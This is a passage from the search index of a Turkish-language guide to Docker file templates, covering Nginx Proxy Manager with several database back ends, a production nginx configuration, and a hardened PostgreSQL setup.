yok!</p>"},{"location":"file-templates/nginx-proxy-manager/#secenek-1-mevcut-postgresmariadbye-baglanma-onerilen","title":"\ud83d\udd17 Se\u00e7enek 1: Mevcut Postgres/MariaDB'ye Ba\u011flanma (\u00d6nerilen)","text":"<p>E\u011fer sunucunuzda zaten \u00e7al\u0131\u015fan bir veritaban\u0131 container'\u0131 varsa (\u00f6rne\u011fin <code>postgres</code> veya <code>mariadb</code>), NPM i\u00e7in yeni bir DB kurmak yerine mevcut DB'nizi kullan\u0131n. Bu hem RAM tasarrufu sa\u011flar hem de y\u00f6netimi kolayla\u015ft\u0131r\u0131r.</p>"},{"location":"file-templates/nginx-proxy-manager/#a-mevcut-postgresqle-baglanma","title":"A. Mevcut PostgreSQL'e Ba\u011flanma","text":""},{"location":"file-templates/nginx-proxy-manager/#adm-1-container-bilgilerinizi-kontrol-edin","title":"Ad\u0131m 1: Container Bilgilerinizi Kontrol Edin","text":"<pre><code># Postgres container'\u0131n\u0131z\u0131n ad\u0131n\u0131 ve network'\u00fcn\u00fc \u00f6\u011frenin\ndocker ps | grep postgres\ndocker inspect &lt;container_adi&gt; | grep -A 10 Networks\n</code></pre> <p>\u00d6rnek \u00c7\u0131kt\u0131:</p> <pre><code>CONTAINER ID   IMAGE                PORTS                      NAMES\nbd35f4d5f95b   postgres:16-alpine   0.0.0.0:15432-&gt;5432/tcp   postgres\n</code></pre> <p>[!IMPORTANT]</p> <ul> <li>Container Ad\u0131: <code>postgres</code> (compose dosyas\u0131nda kullanaca\u011f\u0131z)</li> <li>Internal Port: <code>5432</code> (container'lar aras\u0131 ileti\u015fim)</li> <li>External Port: <code>15432</code> (sadece d\u0131\u015far\u0131dan ba\u011flant\u0131 i\u00e7in, NPM'de KULLANMAYACA\u011eIZ)</li> </ul>"},{"location":"file-templates/nginx-proxy-manager/#adm-2-npm-icin-database-olusturun","title":"Ad\u0131m 2: NPM \u0130\u00e7in Database Olu\u015fturun","text":"<pre><code># Postgres container'\u0131na ba\u011flan\u0131n\ndocker exec -it postgres psql -U postgres\n\n# NPM i\u00e7in database ve kullan\u0131c\u0131 olu\u015fturun\nCREATE DATABASE npm_db;\nCREATE USER npm_user WITH ENCRYPTED PASSWORD 'GucluSifre123!';\nGRANT ALL PRIVILEGES ON DATABASE npm_db TO npm_user;\n\n# Postgres 15+ i\u00e7in ek izin\n\\c npm_db\nGRANT ALL ON SCHEMA public TO npm_user;\n\\q\n</code></pre>"},{"location":"file-templates/nginx-proxy-manager/#adm-3-networku-ogrenin","title":"Ad\u0131m 3: Network'\u00fc \u00d6\u011frenin","text":"<pre><code>docker inspect postgres | grep -A 5 '\"Networks\"'\n</code></pre> <p>\u00d6rnek \u00c7\u0131kt\u0131:</p> <pre><code>\"Networks\": {\n    \"postgres_default\": {\n        \"IPAddress\": \"172.18.0.2\"\n    }\n}\n</code></pre> <p>Network ad\u0131n\u0131 not edin (\u00f6rn: <code>postgres_default</code>).</p>"},{"location":"file-templates/nginx-proxy-manager/#adm-4-npm-docker-compose-dosyas","title":"Ad\u0131m 4: NPM Docker Compose Dosyas\u0131","text":"<p><code>~/npm/docker-compose.yml</code> olu\u015fturun:</p> <pre><code>version: \"3.8\"\n\nservices:\n  app:\n    image: \"jc21/nginx-proxy-manager:latest\"\n    container_name: npm_app\n    restart: always\n    ports:\n      - \"80:80\"\n      - \"81:81\"\n      - \"443:443\"\n    environment:\n      # Mevcut Postgres'e ba\u011flanma\n      DB_POSTGRES_HOST: \"postgres\" # \u2190 Container ad\u0131n\u0131z\n      DB_POSTGRES_PORT: 5432 # \u2190 Internal port (15432 DE\u011e\u0130L!)\n      DB_POSTGRES_USER: \"npm_user\"\n      DB_POSTGRES_PASSWORD: \"GucluSifre123!\"\n      DB_POSTGRES_NAME: \"npm_db\"\n      DISABLE_IPV6: \"true\"\n    volumes:\n      - ./data:/data\n      - ./letsencrypt:/etc/letsencrypt\n    networks:\n      - npm_public\n      - postgres_default # \u2190 Postgres'in network'\u00fc (Ad\u0131m 3'ten)\n\n# Kendi DB container'\u0131m\u0131z YOK!\n\nnetworks:\n  npm_public:\n    external: true\n  postgres_default:\n    external: true # \u2190 Postgres'in mevcut network'\u00fc\n</code></pre>"},{"location":"file-templates/nginx-proxy-manager/#adm-5-public-network-olusturun","title":"Ad\u0131m 5: Public Network Olu\u015fturun","text":"<pre><code>docker network create npm_public\n</code></pre>"},{"location":"file-templates/nginx-proxy-manager/#adm-6-npmi-baslatn","title":"Ad\u0131m 6: NPM'i Ba\u015flat\u0131n","text":"<pre><code>cd ~/npm\ndocker compose up -d\n</code></pre>"},{"location":"file-templates/nginx-proxy-manager/#adm-7-test-edin","title":"Ad\u0131m 7: Test Edin","text":"<pre><code>docker logs npm_app -f\n</code></pre> <p>Ba\u015far\u0131l\u0131 \u00c7\u0131kt\u0131:</p> <pre><code>[INFO] Database connection established\n[INFO] Migrations completed successfully\n</code></pre> <p>Hata Al\u0131rsan\u0131z:</p> <pre><code># Network ba\u011flant\u0131s\u0131n\u0131 test edin\ndocker exec npm_app ping postgres\n\n# Network'\u00fc kontrol edin\ndocker network inspect postgres_default\n</code></pre>"},{"location":"file-templates/nginx-proxy-manager/#b-mevcut-mariadbye-baglanma","title":"B. Mevcut MariaDB'ye Ba\u011flanma","text":"<p>E\u011fer MariaDB kullan\u0131yorsan\u0131z, yukar\u0131daki ad\u0131mlar neredeyse ayn\u0131:</p> <p>Compose Dosyas\u0131 Fark\u0131:</p> <pre><code>environment:\n  # MariaDB i\u00e7in\n  DB_MYSQL_HOST: \"mariadb\" # \u2190 Container ad\u0131n\u0131z\n  DB_MYSQL_PORT: 3306\n  DB_MYSQL_USER: \"npm_user\"\n  DB_MYSQL_PASSWORD: \"GucluSifre123!\"\n  DB_MYSQL_NAME: \"npm_db\"\n</code></pre> <p>Database Olu\u015fturma:</p> <pre><code>docker exec -it mariadb mysql -u root -p\n\nCREATE DATABASE npm_db;\nCREATE USER 'npm_user'@'%' IDENTIFIED BY 'GucluSifre123!';\nGRANT ALL PRIVILEGES ON npm_db.* TO 'npm_user'@'%';\nFLUSH PRIVILEGES;\nEXIT;\n</code></pre>"},{"location":"file-templates/nginx-proxy-manager/#secenek-2-yeni-mariadb-kurulumu","title":"\ud83d\udc2c Se\u00e7enek 2: Yeni MariaDB Kurulumu","text":"<p>E\u011fer sunucunuzda en az 2GB RAM varsa bunu kullan\u0131n.</p> <p><code>/opt/npm</code> dizininde \u015fu yap\u0131y\u0131 kurun:</p> <pre><code>npm/\n\u251c\u2500\u2500 docker-compose.yml\n\u251c\u2500\u2500 .env\n\u251c\u2500\u2500 data/                 # NPM Konfig\u00fcrasyonlar\u0131\n\u251c\u2500\u2500 letsencrypt/          # SSL Sertifikalar\u0131\n\u2514\u2500\u2500 mysql/                # MariaDB Veritaban\u0131 Dosyalar\u0131\n</code></pre> <p>[!WARNING] &gt; SQLite vs MariaDB: \u0130nternetteki standart \u00f6rneklerde <code>mysql</code> klas\u00f6r\u00fc veya servisi g\u00f6remezsiniz \u00e7\u00fcnk\u00fc onlar basit SQLite kullan\u0131r. Biz prod\u00fcksiyon performans\u0131 i\u00e7in MariaDB kullan\u0131yoruz. E\u011fer <code>mysql</code> klas\u00f6r\u00fc olu\u015fturduysan\u0131z a\u015fa\u011f\u0131daki prod\u00fcksiyon compose dosyas\u0131n\u0131 kullanmal\u0131s\u0131n\u0131z.</p>"},{"location":"file-templates/nginx-proxy-manager/#1-mariadb-docker-compose","title":"\ud83d\udc33 1. MariaDB Docker Compose","text":"<p><code>/opt/npm</code> dizininde \u015fu yap\u0131y\u0131 kurun:</p> <pre><code>npm/\n\u251c\u2500\u2500 docker-compose.yml\n\u251c\u2500\u2500 .env\n\u251c\u2500\u2500 data/\n\u251c\u2500\u2500 letsencrypt/\n\u2514\u2500\u2500 mysql/  &lt;-- MariaDB kullanacaksan\u0131z bu klas\u00f6r \u015fart!\n</code></pre> <p><code>docker-compose.yml</code> i\u00e7eri\u011fi:</p> <p><code>docker-compose.yml</code> i\u00e7eri\u011fi:</p> <pre><code>version: \"3.8\"\n\nservices:\n  app:\n    image: \"jc21/nginx-proxy-manager:latest\"\n    container_name: npm_app\n    restart: always\n    ports:\n      # HTTP ve HTTPS Portlar\u0131 (D\u00fcnyaya A\u00e7\u0131k)\n      - \"80:80\"\n      - \"81:81\" # Admin UI (D\u0130KKAT: Firewall ile K\u0131s\u0131tlay\u0131n!)\n      - \"443:443\"\n    environment:\n      # MariaDB Ba\u011flant\u0131 Bilgileri\n      DB_MYSQL_HOST: \"db\"\n      DB_MYSQL_PORT: 3306\n      DB_MYSQL_USER: \"npm\"\n      DB_MYSQL_PASSWORD: \"npm_password\" # .env'den almak daha g\u00fcvenlidir\n      DB_MYSQL_NAME: \"npm\"\n      # IPv6'y\u0131 kapat (Bazen sorun \u00e7\u0131kar\u0131r)\n      DISABLE_IPV6: \"true\"\n    volumes:\n      - ./data:/data\n      - ./letsencrypt:/etc/letsencrypt\n    depends_on:\n      - db\n    networks:\n      - npm_public # Uygulamalarla konu\u015faca\u011f\u0131 a\u011f\n      - npm_internal # Veritaban\u0131 ile konu\u015faca\u011f\u0131 a\u011f\n\n  db:\n    image: \"jc21/mariadb-aria:latest\" # NPM i\u00e7in optimize edilmi\u015f imaj\n    container_name: npm_db\n    restart: always\n    environment:\n      MYSQL_ROOT_PASSWORD: \"npm_root_password\"\n      MYSQL_DATABASE: \"npm\"\n      MYSQL_USER: \"npm\"\n      MYSQL_PASSWORD: \"npm_password\"\n    volumes:\n      - ./mysql:/var/lib/mysql\n    networks:\n      - npm_internal\n\nnetworks:\n  npm_public:\n    external: true # \u00d6nceden yarat\u0131lm\u0131\u015f olmal\u0131 ki di\u011fer app'ler ba\u011flans\u0131n\n  npm_internal:\n    internal: true # D\u0131\u015far\u0131ya kapal\u0131\n</code></pre>"},{"location":"file-templates/nginx-proxy-manager/#secenek-2-sqlite-hafif-surum","title":"\ud83c\udf43 Se\u00e7enek 2: SQLite (Hafif S\u00fcr\u00fcm)","text":"<p>E\u011fer ekstra veritaban\u0131 container'\u0131 ile u\u011fra\u015fmak istemiyorsan\u0131z (veya RAM k\u0131s\u0131tl\u0131ysa) bunu kullan\u0131n.</p> <p>Klas\u00f6r Yap\u0131s\u0131:</p> <pre><code>npm/\n\u251c\u2500\u2500 docker-compose.yml\n\u251c\u2500\u2500 data/\n\u2514\u2500\u2500 letsencrypt/\n# mysql klas\u00f6r\u00fcne gerek yok!\n</code></pre> <p><code>docker-compose.yml</code> (SQLite):</p> <pre><code>version: \"3.8\"\n\nservices:\n  app:\n    image: \"jc21/nginx-proxy-manager:latest\"\n    container_name: npm_app\n    restart: always\n    ports:\n      - \"80:80\"\n      - \"81:81\"\n      - \"443:443\"\n    environment:\n      # Veritaban\u0131 ayar\u0131 YOK (Otomatik SQLite kullan\u0131r)\n      DISABLE_IPV6: \"true\"\n    volumes:\n      - ./data:/data\n      - ./letsencrypt:/etc/letsencrypt\n    networks:\n      - npm_public\n\nnetworks:\n  npm_public:\n    external: true\n</code></pre> <pre><code>---\n\n## \ud83d\udc18 Se\u00e7enek 3: PostgreSQL (Unified Stack)\n\nE\u011fer sisteminizdeki di\u011fer uygulamalar zaten PostgreSQL kullan\u0131yorsa, NPM i\u00e7in de Postgres kullanarak tek bir veritaban\u0131 teknolojisine odaklanabilirsiniz.\n\n**Klas\u00f6r Yap\u0131s\u0131:**\n```text\nnpm/\n\u251c\u2500\u2500 docker-compose.yml\n\u251c\u2500\u2500 data/\n\u251c\u2500\u2500 letsencrypt/\n\u2514\u2500\u2500 postgres/\n</code></pre> <p><code>docker-compose.yml</code> (PostgreSQL):</p> <pre><code>version: \"3.8\"\n\nservices:\n  app:\n    image: \"jc21/nginx-proxy-manager:latest\"\n    container_name: npm_app\n    restart: always\n    ports:\n      - \"80:80\"\n      - \"81:81\"\n      - \"443:443\"\n    environment:\n      # Postgres Ba\u011flant\u0131 Bilgileri\n      DB_POSTGRES_HOST: \"db\"\n      DB_POSTGRES_PORT: 5432\n      DB_POSTGRES_USER: \"npm\"\n      DB_POSTGRES_PASSWORD: \"npm_password\"\n      DB_POSTGRES_NAME: \"npm\"\n      DISABLE_IPV6: \"true\"\n    volumes:\n      - ./data:/data\n      - ./letsencrypt:/etc/letsencrypt\n    depends_on:\n      - db\n    networks:\n      - npm_public\n      - npm_internal\n\n  db:\n    image: postgres:15-alpine\n    container_name: npm_db\n    restart: always\n    environment:\n      POSTGRES_USER: \"npm\"\n      POSTGRES_PASSWORD: \"npm_password\"\n      POSTGRES_DB: \"npm\"\n    volumes:\n      - ./postgres:/var/lib/postgresql/data\n    networks:\n      - npm_internal\n\nnetworks:\n  npm_public:\n    external: true\n  npm_internal:\n    internal: true\n</code></pre>"},{"location":"file-templates/nginx-proxy-manager/#ag-network-yaplandrmas","title":"\ud83d\udd0c A\u011f (Network) Yap\u0131land\u0131rmas\u0131 \ud83d\udd78\ufe0f","text":"<p>Kullan\u0131c\u0131 sordu: \"Niye 2 tane network var? Hepsine ayn\u0131 network\u00fc versek olmaz m\u0131?\"</p> <p>Cevap: Olur ama g\u00fcvenli olmaz. \u0130ki farkl\u0131 a\u011f kullanmam\u0131z\u0131n sebebi \"Sorumluluk Ayr\u0131m\u0131d\u0131r\":</p> <ol> <li><code>npm_public</code> (Trafik Polisi A\u011f\u0131):<ul> <li>Bu a\u011f \"Halka A\u00e7\u0131k\" kap\u0131d\u0131r. NPM, ziyaret\u00e7ileri kar\u015f\u0131lar ve arkadaki Web Sitesine y\u00f6nlendirir.</li> <li>Web sitenizi bu a\u011fa ba\u011flaman\u0131z \u015fartt\u0131r.</li> </ul> </li> <li><code>npm_internal</code> (\u00d6zel Kasa Dairesi):<ul> <li>Bu a\u011f NPM ile kendi veritaban\u0131 (MariaDB) aras\u0131ndad\u0131r.</li> <li>Bunu ay\u0131rmazsak, web sitenizdeki bir a\u00e7\u0131ktan s\u0131zan hacker, NPM'in veritaban\u0131na do\u011frudan eri\u015febilir. Biz bunu engelliyoruz.</li> </ul> </li> </ol>"},{"location":"file-templates/nginx-proxy-manager/#nasl-baglanr","title":"Nas\u0131l Ba\u011flan\u0131r?","text":"<ol> <li>\u00d6nce genel amac\u0131 a\u011f\u0131 olu\u015fturun:</li> </ol> <p>NPM'in di\u011fer container'lara (\u00f6rne\u011fin az \u00f6nceki Redis veya Postgres UI gibi) ula\u015fabilmesi i\u00e7in ortak bir a\u011fa ihtiyac\u0131 vard\u0131r.</p> <ol> <li> <p>\u00d6nce a\u011f\u0131 olu\u015fturun:</p> <pre><code>docker network create npm_public\n</code></pre> </li> <li> <p>Kendi uygulaman\u0131z\u0131 (\u00f6rne\u011fin bir Web Sitesi) bu a\u011fa dahil edin:</p> <pre><code># Web Sitesi Compose Dosyas\u0131\nservices:\n  my-website:\n    image: nginx\n    networks:\n      - default\n      - npm_public # &lt;-- Buraya dahil oldu\n\nnetworks:\n  npm_public:\n    external: true\n</code></pre> </li> <li> <p>NPM Aray\u00fcz\u00fc'nde \"Forward Hostname / IP\" k\u0131sm\u0131na container ad\u0131n\u0131 yaz\u0131n: <code>my-website</code> (Port: 80).</p> </li> </ol>"},{"location":"file-templates/nginx-proxy-manager/#var-olan-postgresqle-baglanma-onerilen","title":"\ud83d\udd17 Var Olan PostgreSQL'e Ba\u011flanma (\u00d6nerilen)","text":"<p>E\u011fer sunucunuzda zaten \u00e7al\u0131\u015fan bir PostgreSQL container'\u0131n\u0131z varsa (\u00f6rne\u011fin <code>production_postgres</code>), NPM i\u00e7in yeni bir veritaban\u0131 container'\u0131 kurmak yerine mevcut Postgres'inizi kullanabilirsiniz. Bu hem kaynak tasarrufu sa\u011flar hem de y\u00f6netimi kolayla\u015ft\u0131r\u0131r.</p>"},{"location":"file-templates/nginx-proxy-manager/#adm-1-npm-icin-veritaban-olusturun","title":"Ad\u0131m 1: NPM \u0130\u00e7in Veritaban\u0131 Olu\u015fturun","text":"<p>Mevcut Postgres container'\u0131n\u0131za ba\u011flan\u0131p NPM i\u00e7in \u00f6zel bir database olu\u015fturun:</p> <pre><code># Postgres container'\u0131na ba\u011flan\ndocker exec -it production_postgres psql -U postgres\n\n# NPM i\u00e7in database ve kullan\u0131c\u0131 olu\u015ftur\nCREATE DATABASE npm_db;\nCREATE USER npm_user WITH ENCRYPTED PASSWORD 'GucluBirSifre123!';\nGRANT ALL PRIVILEGES ON DATABASE npm_db TO npm_user;\n\n# Postgres 15+ i\u00e7in ek izin gerekebilir\n\\c npm_db\nGRANT ALL ON SCHEMA public TO npm_user;\n\n# \u00c7\u0131k\u0131\u015f\n\\q\n</code></pre>"},{"location":"file-templates/nginx-proxy-manager/#adm-2-network-baglantsn-kontrol-edin","title":"Ad\u0131m 2: Network Ba\u011flant\u0131s\u0131n\u0131 Kontrol Edin","text":"<p>NPM ve Postgres'in ayn\u0131 Docker network'\u00fcnde olmas\u0131 gerekir. Postgres'inizin hangi network'te oldu\u011funu kontrol edin:</p> <pre><code>docker inspect production_postgres | grep -A 10 Networks\n</code></pre> <p>\u00c7\u0131kt\u0131 \u00f6rne\u011fi:</p> <pre><code>\"Networks\": {\n    \"backend_net\": {\n        \"IPAddress\": \"172.18.0.2\",\n        ...\n    }\n}\n</code></pre> <p>E\u011fer Postgres'iniz <code>backend_net</code> gibi \u00f6zel bir network'teyse, bu network'\u00fc NPM compose dosyas\u0131na eklemeniz gerekir.</p>"},{"location":"file-templates/nginx-proxy-manager/#adm-3-npm-docker-compose-dosyas-harici-db","title":"Ad\u0131m 3: NPM Docker Compose Dosyas\u0131 (Harici DB)","text":"<p>NPM klas\u00f6r\u00fcn\u00fczde (<code>~/npm/</code>) \u015fu <code>docker-compose.yml</code> dosyas\u0131n\u0131 olu\u015fturun:</p> <pre><code>version: \"3.8\"\n\nservices:\n  app:\n    image: \"jc21/nginx-proxy-manager:latest\"\n    container_name: npm_app\n    restart: always\n    ports:\n      - \"80:80\"\n      - \"81:81\"\n      - \"443:443\"\n    environment:\n      # Mevcut Postgres'e ba\u011flanma ayarlar\u0131\n      DB_POSTGRES_HOST: \"production_postgres\" # Container ad\u0131\n      DB_POSTGRES_PORT: 5432\n      DB_POSTGRES_USER: \"npm_user\"\n      DB_POSTGRES_PASSWORD: \"GucluBirSifre123!\"\n      DB_POSTGRES_NAME: \"npm_db\"\n      DISABLE_IPV6: \"true\"\n    volumes:\n      - ./data:/data\n      - ./letsencrypt:/etc/letsencrypt\n    networks:\n      - npm_public # D\u0131\u015f d\u00fcnyaya a\u00e7\u0131k (web trafi\u011fi i\u00e7in)\n      - backend_net # Postgres'in oldu\u011fu network\n\n# Kendi DB servisimiz YOK (mevcut Postgres'i kullan\u0131yoruz)\n\nnetworks:\n  npm_public:\n    external: true\n  backend_net:\n    external: true # Postgres'in network'\u00fc\n</code></pre>"},{"location":"file-templates/nginx-proxy-manager/#adm-4-networkleri-olusturun-yoksa","title":"Ad\u0131m 4: Network'leri Olu\u015fturun (Yoksa)","text":"<pre><code># NPM i\u00e7in public network\ndocker network create npm_public\n\n# Backend network zaten varsa bu ad\u0131m\u0131 atlay\u0131n\n# Yoksa olu\u015fturun:\ndocker network create backend_net\n</code></pre>"},{"location":"file-templates/nginx-proxy-manager/#adm-5-postgresi-ayn-networke-ekleyin","title":"Ad\u0131m 5: Postgres'i Ayn\u0131 Network'e Ekleyin","text":"<p>E\u011fer Postgres container'\u0131n\u0131z <code>backend_net</code>'te de\u011filse, ona ba\u011flay\u0131n:</p> <pre><code>docker network connect backend_net production_postgres\n</code></pre>"},{"location":"file-templates/nginx-proxy-manager/#adm-6-npmi-baslatn_1","title":"Ad\u0131m 6: NPM'i Ba\u015flat\u0131n","text":"<pre><code>cd ~/npm\ndocker compose up -d\n</code></pre>"},{"location":"file-templates/nginx-proxy-manager/#adm-7-baglanty-test-edin","title":"Ad\u0131m 7: Ba\u011flant\u0131y\u0131 Test Edin","text":"<p>NPM loglar\u0131n\u0131 kontrol edin:</p> <pre><code>docker logs npm_app -f\n</code></pre> <p>Ba\u015far\u0131l\u0131 ba\u011flant\u0131 mesaj\u0131:</p> <pre><code>[INFO] Database connection established\n[INFO] Migrations completed successfully\n</code></pre> <p>Hata al\u0131rsan\u0131z:</p> <pre><code># Postgres'ten NPM'e eri\u015fim var m\u0131?\ndocker exec npm_app ping production_postgres\n\n# Network ba\u011flant\u0131s\u0131n\u0131 kontrol et\ndocker network inspect backend_net\n</code></pre>"},{"location":"file-templates/nginx-proxy-manager/#onemli-notlar","title":"\u00d6nemli Notlar","text":"<p>[!WARNING] &gt; G\u00fcvenlik: <code>DB_POSTGRES_PASSWORD</code> gibi hassas bilgileri <code>.env</code> dosyas\u0131nda tutun:</p> <pre><code># .env dosyas\u0131\nPOSTGRES_PASSWORD=GucluBirSifre123!\n</code></pre> <p>Sonra compose dosyas\u0131nda:</p> <pre><code>environment:\n  DB_POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}\n</code></pre> <p>[!TIP] &gt; Yedekleme: NPM'in veritaban\u0131 \u00e7ok k\u00fc\u00e7\u00fckt\u00fcr (birka\u00e7 MB). Postgres yedeklerinize <code>npm_db</code> database'ini de dahil etmeyi unutmay\u0131n:</p> <pre><code>docker exec production_postgres pg_dump -U postgres npm_db &gt; npm_backup.sql\n</code></pre>"},{"location":"file-templates/nginx-proxy-manager/#guvenlik-uyars-port-81","title":"\ud83d\udee1\ufe0f G\u00fcvenlik Uyar\u0131s\u0131: Port 81","text":"<p><code>81</code> portu NPM'in y\u00f6netim panelidir. Varsay\u0131lan kullan\u0131c\u0131 \u015fifresi: <code>admin@example.com</code> / <code>changeme</code>.</p> <p>Kesinlikle Yap\u0131lmas\u0131 Gerekenler:</p> <ol> <li>\u0130lk giri\u015fte \u015fifreyi de\u011fi\u015ftirin.</li> <li>M\u00fcmk\u00fcnse <code>81</code> portunu Firewall (UFW) ile d\u0131\u015f d\u00fcnyaya kapat\u0131n, sadece kendi IP'nize veya VPN IP'nize a\u00e7\u0131n.</li> </ol> <pre><code># Sadece y\u00f6netim IP'sine izin ver\nsudo ufw allow form 1.2.3.4 to any port 81\nsudo ufw deny 81\n</code></pre>"},{"location":"file-templates/nginx/","title":"Production Nginx Config","text":"<pre><code>user  nginx;\nworker_processes  auto;\n\nerror_log  /var/log/nginx/error.log notice;\npid        /var/run/nginx.pid;\n\nevents {\n    worker_connections  1024;\n}\n\nhttp {\n    include       /etc/nginx/mime.types;\n    default_type  application/octet-stream;\n\n    # Security Headers\n    add_header X-Frame-Options \"SAMEORIGIN\";\n    add_header X-XSS-Protection \"1; mode=block\";\n    add_header X-Content-Type-Options \"nosniff\";\n\n    # Optimization\n    sendfile        on;\n    keepalive_timeout  65;\n    gzip  on;\n\n    server {\n        listen 80;\n        server_name example.com;\n\n        # Redirect to HTTPS\n        location / {\n            return 301 https://$host$request_uri;\n        }\n    }\n\n    server {\n        listen 443 ssl http2;\n        server_name example.com;\n\n        ssl_certificate /etc/nginx/certs/fullchain.pem;\n        ssl_certificate_key /etc/nginx/certs/privkey.pem;\n\n        # Proxy to App\n        location / {\n            proxy_pass http://app:3000;\n            proxy_http_version 1.1;\n            proxy_set_header Upgrade $http_upgrade;\n            proxy_set_header Connection 'upgrade';\n            proxy_set_header Host $host;\n            proxy_cache_bypass $http_upgrade;\n        }\n    }\n}\n</code></pre>"},{"location":"file-templates/postgres/","title":"PostgreSQL (Production Ready) \ud83d\udc18","text":"<p>Bu \u015fablon, veritaban\u0131n\u0131z\u0131 Docker Secrets kullanarak ve Capability Dropping yaparak en g\u00fcvenli \u015fekilde aya\u011fa kald\u0131rman\u0131z\u0131 sa\u011flar. Ayr\u0131ca ba\u015flang\u0131\u00e7 senaryolar\u0131n\u0131 (seed data) destekler.</p>"},{"location":"file-templates/postgres/#klasor-yaps","title":"\ud83c\udfd7\ufe0f Klas\u00f6r Yap\u0131s\u0131","text":"<p>Sunucuda <code>/opt/postgres</code> veya benzeri bir dizinde \u015fu yap\u0131y\u0131 kurmal\u0131s\u0131n\u0131z:</p> <pre><code>postgres/\n\u251c\u2500\u2500 docker-compose.yml\n\u251c\u2500\u2500 .env                  # Sadece versiyon vb. de\u011fi\u015fkenler (\u015e\u0130FRE YOK!)\n\u251c\u2500\u2500 secrets/              # \u015eifrelerin tutuldu\u011fu klas\u00f6r\n\u2502   \u251c\u2500\u2500 db_password.txt\n\u2502   \u2514\u2500\u2500 db_root_password.txt\n\u251c\u2500\u2500 configs/              # \u00d6zel konfig\u00fcrasyonlar\n\u2502   \u2514\u2500\u2500 postgresql.conf\n\u251c\u2500\u2500 init-scripts/         # [YEN\u0130] Ba\u015flang\u0131\u00e7ta \u00e7al\u0131\u015facak SQL'ler\n\u2502   \u2514\u2500\u2500 01-init.sql\n\u2514\u2500\u2500 data/                 # Verilerin tutulaca\u011f\u0131 yer\n</code></pre>"},{"location":"file-templates/postgres/#1-secrets-sifreler","title":"\ud83d\udd10 1. Secrets (\u015eifreler)","text":"<p>\u015eifreleri environment variable yerine dosyadan okutmak, <code>docker inspect</code> yap\u0131ld\u0131\u011f\u0131nda \u015fifrelerin g\u00f6r\u00fcnmesini engeller.</p> <ol> <li>Klas\u00f6r\u00fc olu\u015fturun: <code>mkdir secrets</code></li> <li>Dosyalar\u0131 olu\u015fturun (Sat\u0131r sonu bo\u015flu\u011fu olmas\u0131n):</li> </ol> <pre><code>echo \"CokGizliSifre123\" &gt; secrets/db_password.txt\necho \"RootIcinBaskaSifre456\" &gt; secrets/db_root_password.txt\nchmod 600 secrets/* # Dosyalar\u0131 sadece root okuyabilsin\n</code></pre>"},{"location":"file-templates/postgres/#2-baslangc-scriptleri-init-scripts","title":"\ud83d\udcdc 2. Ba\u015flang\u0131\u00e7 Scriptleri (Init Scripts)","text":"<p>Veritaban\u0131 ilk kez olu\u015fturulurken (veri klas\u00f6r\u00fc bo\u015fken) \u00e7al\u0131\u015fmas\u0131n\u0131 istedi\u011finiz SQL veya Shell scriptlerini <code>init-scripts/</code> klas\u00f6r\u00fcne koyabilirsiniz. \u0130sim s\u0131ras\u0131na g\u00f6re \u00e7al\u0131\u015f\u0131rlar (<code>01-...</code>, <code>02-...</code>).</p> <p>\u00d6rnek <code>init-scripts/01-init.sql</code>:</p> <pre><code>-- Ekstra veritaban\u0131 olu\u015ftur\nCREATE DATABASE analytics;\n\n-- Bir tablo olu\u015ftur\n\\connect analytics;\nCREATE TABLE visits (\n    id SERIAL PRIMARY KEY,\n    ip VARCHAR(50),\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n</code></pre>"},{"location":"file-templates/postgres/#3-docker-compose-dosyas","title":"\ud83d\udc33 3. Docker Compose Dosyas\u0131","text":"<p><code>docker-compose.yml</code> i\u00e7eri\u011fi:</p> <pre><code>version: \"3.8\"\n\nservices:\n  db:\n    image: postgres:15-alpine\n    container_name: production_db\n    restart: always\n    # \u00d6zel config dosyas\u0131n\u0131 kullanmas\u0131 i\u00e7in komut:\n    command: postgres -c \"config_file=/etc/postgresql/postgresql.conf\"\n    ports:\n      - \"127.0.0.1:5432:5432\" # SADECE localhost'a a\u00e7\n    environment:\n      POSTGRES_DB: app_production\n      POSTGRES_USER: app_user\n      POSTGRES_PASSWORD_FILE: /run/secrets/db_password\n    volumes:\n      # Veri Kal\u0131c\u0131l\u0131\u011f\u0131\n      - /mnt/blockvolume/postgres-data:/var/lib/postgresql/data\n      # \u00d6zel Config\n      - ./configs/postgresql.conf:/etc/postgresql/postgresql.conf\n      # [YEN\u0130] Ba\u015flang\u0131\u00e7 Scriptleri\n      - ./init-scripts:/docker-entrypoint-initdb.d\n    secrets:\n      - db_password\n\n    # --- G\u00dcVENL\u0130K (HARDENING) ---\n    # Container'\u0131n gereksiz t\u00fcm Linux yetkilerini al\u0131yoruz\n    cap_drop:\n      - ALL\n    # Sadece Postgres'in \u00e7al\u0131\u015fmas\u0131 i\u00e7in gerekenleri geri veriyoruz\n    cap_add:\n      - CHOWN\n      - SETGID\n      - SETUID\n      # Baz\u0131 durumlarda DAC_OVERRIDE gerekebilir ama \u00f6nce bunlar denenmeli\n\n    # --- KAYNAKLAR ---\n    mem_limit: 4g\n    cpus: 2.0\n\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U app_user -d app_production\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n\nsecrets:\n  db_password:\n    file: ./secrets/db_password.txt\n</code></pre>"},{"location":"file-templates/postgres/#4-konfigurasyon-postgresqlconf","title":"\u2699\ufe0f 4. Konfig\u00fcrasyon (<code>postgresql.conf</code>)","text":"<p><code>configs/postgresql.conf</code> dosyas\u0131:</p> <pre><code># --- BA\u011eLANTI ---\nlisten_addresses = '*'\nmax_connections = 100\n\n# --- BELLEK (4GB RAM i\u00e7in Tuning) ---\nshared_buffers = 1GB\neffective_cache_size = 3GB\nmaintenance_work_mem = 256MB\ncheckpoint_completion_target = 0.9\nwal_buffers = 16MB\ndefault_statistics_target = 100\nrandom_page_cost = 1.1\neffective_io_concurrency = 200\nwork_mem = 10MB\n\n# --- LOGLAMA ---\nlog_destination = 'stderr'\nlogging_collector = on\nlog_directory = 'log'\nlog_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'\nlog_statement = 'ddl'\n</code></pre>"},{"location":"file-templates/postgres/#5-baslatma","title":"\ud83d\ude80 5. Ba\u015flatma","text":"<pre><code>docker compose up -d\n</code></pre>"},{"location":"file-templates/redis/","title":"Redis (Production Ready) \ud83d\udd34","text":"<p>Redis varsay\u0131lan olarak \"g\u00fcvensiz\" gelir (\u015fifresizdir, her yere a\u00e7\u0131kt\u0131r). Bu \u015fablon ile onu sertle\u015ftirilmi\u015f (hardened), 